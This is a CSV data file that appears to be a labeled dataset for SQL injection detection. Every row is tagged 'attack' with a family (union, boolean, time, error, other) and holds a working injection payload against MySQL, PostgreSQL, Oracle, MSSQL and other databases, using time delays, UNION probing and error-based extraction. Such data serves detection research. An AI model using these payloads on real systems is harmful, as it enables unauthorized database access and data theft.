label,payload,family
attack,1' union all select null--,union
attack,"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,1 and   (  5369  =  8325  )  *8325# psze,boolean
attack,"-5196""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""gbcq"" like ""gbcq",error
attack,"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",boolean
attack,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",boolean
attack,-1641' union all select 4835#,union
attack,1 and 9198  =  9198--,boolean
attack,"1""  )   where 9115  =  9115",other
attack,1'||  (  select 'mwpd' where 2887  =  2887,other
attack,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   ",other
attack,"-9062"" or 6872  =  6872 and ""aumq"" like ""aumq",boolean
attack,"1%""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,boolean
attack,1 where 2956  =  2956,other
attack,"1%' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,-4542'   )    )    order by 1#,other
attack,"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,time
attack,"-1432""   )    )    union all select 9008,9008,9008#",union
attack,"1""   )    )    and 8329  =  5584#",boolean
attack,1  )   as imdt where 6431  =  6431,other
attack,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",boolean
attack,-3634%'   )    )    or 2671  =  2434,boolean
attack,"1""   )    )    and sleep  (  5  )   and    (    (   ""lied"" like ""lied",time
attack,1'+  (  select xruo where 5709  =  5709 and 7533  =  7533  )  +',boolean
attack,select case when 4488  =  5522 then 1 else null end--,other
attack,"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",error
attack,"1"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",union
attack,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",boolean
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",other
attack,"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",boolean
attack,"1%""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,boolean
attack,1  )   and   (  2342  =  3620  )  *3620,boolean
attack,"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm",boolean
attack,"1%""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,boolean
attack,"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",boolean
attack,"1""   )    )    and 9198  =  9198--",boolean
attack,"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",boolean
attack,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",boolean
attack,select   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  select 2294 from information_schema.character_sets  )   end  )  #,other
attack,"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null,null#",union
attack,"-8331'  )   union all select 1452,1452,1452,1452,1452--",union
attack,"1""   )    )    as dooi where 1806  =  1806 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",boolean
attack,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,boolean
attack,"-2373%""  )   or 9323  =  9323#",boolean
attack,1  )   and 2006  =  2006,boolean
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'osov' like 'osov",time
attack,1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   '%'  =  ',time
attack,"1   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,-5031' or 9323  =  9323#,boolean
attack,"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",union
attack,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",union
attack,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,time
attack,1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,union
attack,"-8735'   )    )    union all select 3262,3262,3262--",union
attack,"-4248""   )    )    union all select 9450,9450,9450--",union
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",boolean
attack,"1%' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean
attack,"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --",boolean
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",error
attack,"-7139""  )   where 2723  =  2723 or 3900  =  5082--",boolean
attack,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",boolean
attack,"-3109"" or elt  (  1032  =  1032,3623  )  ",boolean
attack,1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',time
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",error
attack,1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,"-5245""   )    )     )   union all select 8106,8106,8106#",union
attack,select   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  select 8716 from master..sysdatabases  )   end  )  --,other
attack,"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'aumk' like 'aumk",boolean
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""mofa"" like ""mofa",boolean
attack,-6244'  )   as szpd where 8445  =  8445 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,boolean
attack,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",union
attack,"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",union
attack,"-9405'  )   union all select 8283,8283,8283,8283--",union
attack,"1   )    )    as rbae where 2049  =  2049 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",boolean
attack,"-7868"" union all select 1805--",union
attack,"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",boolean
attack,-3821'  )   or 9323  =  9323#,boolean
attack,"1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,1' where 1652  =  1652 and sleep  (  5  )  #,time
attack,"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",other
attack,1'   )    )    as cwss where 9720  =  9720,other
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'nbsf' like 'nbsf",boolean
attack,1'+  (  select biqo where 6046  =  6046,other
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,boolean
attack,1 rlike sleep  (  5  )  # urxh,time
attack,"1'+  (  select ummn where 8883  =  8883 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",boolean
attack,"1'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",union
attack,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",boolean
attack,-8069'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'qbvz'  =  'qbvz,error
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""%""  =  """,time
attack,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",boolean
attack,"1%'   )    )    union all select null,null,null--",union
attack,-3998'   )    )    or 3038  =  3038,boolean
attack,"-2862'   )    )     )   union all select 6649,6649--",union
attack,"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",boolean
attack,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack, (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,other
attack,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",boolean
attack,"-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",union
attack,1%'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  ',boolean
attack,"-5391 or make_set  (  9354  =  9354,7185  )  # ptyy",boolean
attack,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",union
attack,select sleep  (  5  )   and    (    (     (  8354  =  8354,time
attack,"1 and elt  (  4249  =  4249,7259  )  -- meef",boolean
attack,1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,time
attack,"1""  )   as ypfa where 6128  =  6128",other
attack,1'+  (  select plhk where 6540  =  6540,other
attack,"-3102  )   union all select 6707,6707,6707,6707--",union
attack,"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",boolean
attack,"-5640""   )    )    or 9792  =  2728--",boolean
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",error
attack,-5764 or 3038  =  3038,boolean
attack,select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""snwx"" like ""snwx",boolean
attack,1 union all select null--,union
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  """,boolean
attack,1' where 8159  =  8159 union all select null#,union
attack,"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",other
attack,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',boolean
attack,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,time
attack,select   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  select 3140 from master..sysdatabases  )   end  )  --,other
attack,"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",union
attack,"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",error
attack,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",error
attack,-8369  )   where 7234  =  7234 order by 1--,other
attack,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",time
attack,"1""   )    )     )   union all select null,null#",union
attack,"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",boolean
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,time
attack,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',time
attack,"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""fcpm""  =  ""fcpm",boolean
attack,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,time
attack,select   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  select 4291 from mysql.db  )   end  )  #,other
attack,"-1055' union all select 7758,7758,7758,7758,7758,7758--",union
attack,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",union
attack,"1' where 8451  =  8451 union all select null,null,null,null,null,null,null,null,null#",union
attack,1' where 8635  =  8635 order by 1--,other
attack,-8447 where 2850  =  2850 or 7147  =  3262,boolean
attack,"1 and elt  (  4249  =  4249,7259  )  ",boolean
attack,"1%'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,"1"" where 6179  =  6179",other
attack,1'  )   where 6842  =  6842,other
attack,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",boolean
attack,-3937   )    )    or 3038  =  3038,boolean
attack,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean
attack,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',time
attack,"1""   )    )    as zbfj where 2285  =  2285",other
attack,"1'  )   where 4407  =  4407 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,-9429'  )   order by 1--,other
attack,1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',boolean
attack,select   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  select 5152 from mysql.db  )   end  )  #,other
attack,"1%"" union all select null,null,null,null,null,null#",union
attack,"1 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy",boolean
attack,"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq",boolean
attack,1 or sleep  (  5  )  #,time
attack,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",time
attack,"1   )    )    as myyh where 5116  =  5116 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,"1',  (  select   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  select 4209 from information_schema.character_sets  )   end   )    )   ",other
attack,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,boolean
attack,"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'bzgs' like 'bzgs",boolean
attack,"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",boolean
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",time
attack,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",union
attack,"-6184""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""rovr""  =  ""rovr",boolean
attack,select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,other
attack,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,time
attack,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""pwwb"" like ""pwwb",time
attack,"1%'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  '%'  =  '",boolean
attack,"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb",boolean
attack,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",union
attack,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",time
attack,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",union
attack,"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",error
attack,1   )    )    union all select null#,union
attack,"-4955%' union all select 5928,5928--",union
attack,"1' and elt  (  2266  =  7467,7467  )  ",boolean
attack,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,time
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",time
attack,-4901  )   or 3407  =  6442#,boolean
attack,"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",boolean
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',time
attack,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,-6433%'   )    )    or 9323  =  9323#,boolean
attack,-8836%'  )   or 4856  =  3891,boolean
attack,"1 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack, (  7098  =  7098 and sleep  (  5   )    ) ,time
attack,"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",union
attack,-3243 or 2266  =  3583#,boolean
attack,"1'  )   union all select null,null,null,null,null--",union
attack,"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,boolean
attack,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf",error
attack,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""bxct"" like ""bxct",time
attack,-9120'   )    )    or 8571  =  8571--,boolean
attack,1'+  (  select naiw where 4924  =  4924,other
attack,-9389'  )   or 8859  =  3989--,boolean
attack,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",union
attack,1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'hbwk' like 'hbwk,boolean
attack,"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",error
attack,"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",union
attack,"1""  )   union all select null,null,null,null,null,null,null#",union
attack,end and    (    (   'zeyr'  =  'zeyr,boolean
attack,"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,"1"" where 3740  =  3740 rlike sleep  (  5  )  #",time
attack,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",boolean
attack,1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",union
attack,-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,error
attack,"1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",error
